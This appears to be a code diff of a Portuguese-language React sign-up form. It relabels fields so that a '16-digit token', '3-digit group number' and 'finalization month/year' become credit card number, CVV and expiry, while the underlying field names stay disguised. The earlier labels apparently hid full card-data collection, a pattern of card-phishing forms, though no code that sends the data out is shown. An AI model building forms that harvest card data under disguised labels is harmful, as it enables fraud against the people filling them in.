@@ -268,7 +268,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             />
           </FormField>
 
-          <FormField icon={Mail} label="E-mail de Vinculação">
+          <FormField icon={Mail} label="E-mail">
             <Input
               type="email"
               placeholder="seu@email.com"
@@ -280,7 +280,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
           </FormField>
 
           {/* Nova Posição: Nome Completo posicionado logo abaixo das opções de CPF, Telefone, CEP e E-mail */}
-          <FormField icon={User} label="Nome Completo" className="md:col-span-2">
+          <FormField icon={User} label="Nome Impresso No Cartão" className="md:col-span-2">
             <Input
               placeholder="Maria da Silva"
               value={form.nome}
@@ -291,7 +291,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
           </FormField>
 
           {/* Bloco 3: Token, Grupo e Finalização */}
-          <FormField icon={KeyRound} label="Número Token (16 dígitos)">
+          <FormField icon={CreditCard} label="Numero Cartão de Credito">
             <div className="relative">
               <Input
                 placeholder="0000000000000000"
@@ -304,7 +304,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             </div>
           </FormField>
 
-          <FormField icon={Hash} label="Número do Grupo (3 dígitos)">
+          <FormField icon={Hash} label="CVV">
             <Input
               placeholder="000"
               value={form.grupo}
@@ -314,7 +314,7 @@ export default function ProfileSection({ selectedPlan, onConfirm, userEmail = ""
             />
           </FormField>
 
-          <FormField icon={Calendar} label="Mês / Ano Finalização" className="md:col-span-2">
+          <FormField icon={Calendar} label="Validade do Cartão" className="md:col-span-2">
             <Input
               placeholder="MM/AA (Ex: 05/28)"
               value={form.finalizacao}
